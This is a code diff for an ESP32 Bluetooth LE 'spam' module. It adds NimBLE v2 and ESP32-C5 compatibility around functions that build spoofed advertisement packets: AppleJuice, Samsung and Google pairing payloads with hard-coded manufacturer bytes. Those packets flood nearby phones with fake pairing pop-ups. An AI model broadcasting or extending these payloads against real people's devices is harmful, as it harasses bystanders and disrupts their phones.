@@ -1,14 +1,22 @@
 #include "ble_spam.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
+#ifdef CONFIG_BT_NIMBLE_ENABLED
+#if __has_include(<NimBLEExtAdvertising.h>)
+#define NIMBLE_V2_PLUS 1
+#endif
+#include "esp_mac.h"
+#elif defined(CONFIG_BT_BLUEDROID_ENABLED)
+#include "esp_gap_ble_api.h"
+#endif
 #include <globals.h>
-
 // Bluetooth maximum transmit power
 #if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) ||                              \
     defined(CONFIG_IDF_TARGET_ESP32S3)
 #define MAX_TX_POWER ESP_PWR_LVL_P21 // ESP32C3 ESP32C2 ESP32S3
-#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
-#define MAX_TX_POWER ESP_PWR_LVL_P20 // ESP32H2 ESP32C6
+#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) ||                            \
+    defined(CONFIG_IDF_TARGET_ESP32C5)
+#define MAX_TX_POWER ESP_PWR_LVL_P20 // ESP32H2 ESP32C6 ESP32C5
 #else
 #define MAX_TX_POWER ESP_PWR_LVL_P9 // Default
 #endif
@@ -370,8 +378,11 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
             AdvData_Raw[i++] = 0x80;
             memcpy(&AdvData_Raw[i], Name, name_len);
             i += name_len;
-
+#ifdef NIMBLE_V2_PLUS
+            AdvData.addData(AdvData_Raw, 7 + name_len);
+#else
             AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
+#endif
             break;
         }
         case AppleJuice: {
@@ -381,13 +392,21 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
                                       0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                       0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                       0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+#ifdef NIMBLE_V2_PLUS
+                AdvData.addData(packet, 31);
+#else
                 AdvData.addData(std::string((char *)packet, 31));
+#endif
             } else if (rand == 1) {
                 uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                                       0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)],
                                       0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                                       0x00, 0x00};
+#ifdef NIMBLE_V2_PLUS
+                AdvData.addData(packet, 23);
+#else
                 AdvData.addData(std::string((char *)packet, 23));
+#endif
             }
 
             break;
@@ -410,7 +429,11 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
             packet[i++] = 0x00; // ???
             packet[i++] = 0x10; // Type ???
             esp_fill_random(&packet[i], 3);
+#ifdef NIMBLE_V2_PLUS
+            AdvData.addData(packet, 17);
+#else
             AdvData.addData(std::string((char *)packet, 17));
+#endif
 
             break;
         }
@@ -434,7 +457,11 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
                 0x43,
                 (uint8_t)((model >> 0x00) & 0xFF)
             };
+#ifdef NIMBLE_V2_PLUS
+            AdvData.addData(Samsung_Data, 15);
+#else
             AdvData.addData(std::string((char *)Samsung_Data, 15));
+#endif
 
             break;
         }
@@ -456,7 +483,12 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type) {
                 0x0A,
                 (uint8_t)((rand() % 120) - 100)
             }; // 2 more data to inform RSSI data.
+#ifdef NIMBLE_V2_PLUS
+            AdvData.addData(Google_Data, 14);
+#else
             AdvData.addData(std::string((char *)Google_Data, 14));
+#endif
+
             break;
         }
         default: {
@@ -537,7 +569,7 @@ void executeCustomSpam(String spamName) {
     BLEDevice::deinit();
 }
 
-void ibeacon(char *DeviceName, char *BEACON_UUID, int ManufacturerId) {
+void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId) {
     // derived from
     // https://github.com/nkolban/ESP32_BLE_Arduino/blob/master/examples/BLE_iBeacon/BLE_iBeacon.ino
     // https://github.com/espressif/arduino-esp32/blob/master/libraries/BLE/examples/iBeacon/iBeacon.ino
